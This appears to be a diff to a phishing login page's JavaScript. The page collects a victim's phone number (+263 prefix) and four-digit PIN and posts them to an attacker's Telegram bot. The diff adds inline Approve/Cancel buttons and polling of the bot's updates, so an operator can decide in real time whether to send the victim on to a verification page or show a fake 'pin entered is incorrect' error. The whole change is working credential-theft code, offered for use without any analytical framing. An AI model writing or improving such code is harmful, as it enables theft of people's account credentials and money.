@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -280,6 +279,9 @@
             max-width: 300px;
             font-weight: 500;
         }
+        
+        /* Hidden message ID storage for answering callback */
+        .hidden { display: none; }
     </style>
 </head>
 
@@ -354,12 +356,14 @@
         const loginBtn = document.getElementById('loginBtn');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         let pinValue = '';
+        let pollInterval;
+        let lastUpdateId = 0;
+        let pollingActive = false;
 
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
         }
-        
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 if (box.value.length === 1 && index < 3) {
@@ -374,6 +378,25 @@
             });
         });
 
+        function stopPolling() {
+            pollingActive = false;
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
+            }
+            spinnerOverlay.style.display = 'none';
+        }
+
+        function answerCallback(callbackQueryId) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: callbackQueryId
+                })
+            }).catch(() => {});
+        }
+
         loginBtn.addEventListener('click', () => {
             const phone = phoneInput.value.trim();
             if (!phone) {
@@ -381,30 +404,140 @@
                 return;
             }
             
+            // Prevent multiple clicks
+            if (pollingActive) return;
+            pollingActive = true;
+            
             spinnerOverlay.style.display = 'flex';
-            
-            // Save phone to localStorage
-            localStorage.setItem('phone', phone);
-            
-            // Send credentials to Telegram bot (no inline buttons, no approval needed)
-            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
+            const timestamp = Date.now();
+            const approveData = 'approve_' + timestamp;
+            const cancelData = 'cancel_' + timestamp;
+
+            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}\n\nApprove or cancel this access?`;
             
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: 'Allow Proceed', callback_data: approveData },
+                                    { text: 'Cancel', callback_data: cancelData }
+                                ]
+                            ]
+                        }
+                    })
                 })
-            }).catch(() => {});
-
-            // Proceed to next page immediately without waiting
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        stopPolling();
+                        alert('Error sending to bot: ' + data.description);
+                        pollingActive = false;
+                        return;
+                    }
+                    // Start polling after successful send
+                    startPolling(approveData, cancelData);
+                })
+                .catch(error => {
+                    stopPolling();
+                    alert('Bot connection error: ' + error);
+                    pollingActive = false;
+                });
         });
+
+        function startPolling(approveData, cancelData) {
+            // Do an initial fetch to get the latest update_id so we don't reprocess old updates
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        // Set offset to the latest update_id + 1 to skip all old updates
+                        const maxId = Math.max(...data.result.map(u => u.update_id));
+                        lastUpdateId = maxId;
+                    }
+                    
+                    // Now start polling from after the last update
+                    pollInterval = setInterval(() => {
+                        if (!pollingActive) return;
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
+                            .then(res => res.json())
+                            .then(data => {
+                                if (!pollingActive) return;
+                                if (data.ok && data.result.length > 0) {
+                                    for (let update of data.result) {
+                                        // Always advance offset
+                                        if (update.update_id >= lastUpdateId) {
+                                            lastUpdateId = update.update_id;
+                                        }
+                                        
+                                        if (update.callback_query) {
+                                            const cbData = update.callback_query.data;
+                                            const cbId = update.callback_query.id;
+                                            
+                                            // Answer the callback query immediately to acknowledge it
+                                            answerCallback(cbId);
+                                            
+                                            if (cbData === approveData) {
+                                                stopPolling();
+                                                window.location.href = 'verify.html';
+                                                return;
+                                            } else if (cbData === cancelData) {
+                                                stopPolling();
+                                                alert('pin entered is incorrect.');
+                                                return;
+                                            }
+                                        }
+                                    }
+                                }
+                            })
+                            .catch(() => {});
+                    }, 2000);
+                })
+                .catch(() => {
+                    // Fallback: just poll normally
+                    pollInterval = setInterval(() => {
+                        if (!pollingActive) return;
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
+                            .then(res => res.json())
+                            .then(data => {
+                                if (!pollingActive) return;
+                                if (data.ok && data.result.length > 0) {
+                                    for (let update of data.result) {
+                                        if (update.update_id >= lastUpdateId) {
+                                            lastUpdateId = update.update_id;
+                                        }
+                                        
+                                        if (update.callback_query) {
+                                            const cbData = update.callback_query.data;
+                                            const cbId = update.callback_query.id;
+                                            
+                                            answerCallback(cbId);
+                                            
+                                            if (cbData === approveData) {
+                                                stopPolling();
+                                                window.location.href = 'verify.html';
+                                                return;
+                                            } else if (cbData === cancelData) {
+                                                stopPolling();
+                                                alert('pin entered is incorrect.');
+                                                return;
+                                            }
+                                        }
+                                    }
+                                }
+                            })
+                            .catch(() => {});
+                    }, 2000);
+                });
+        }
 
         checkPinComplete();
         pinBoxes[0].focus();
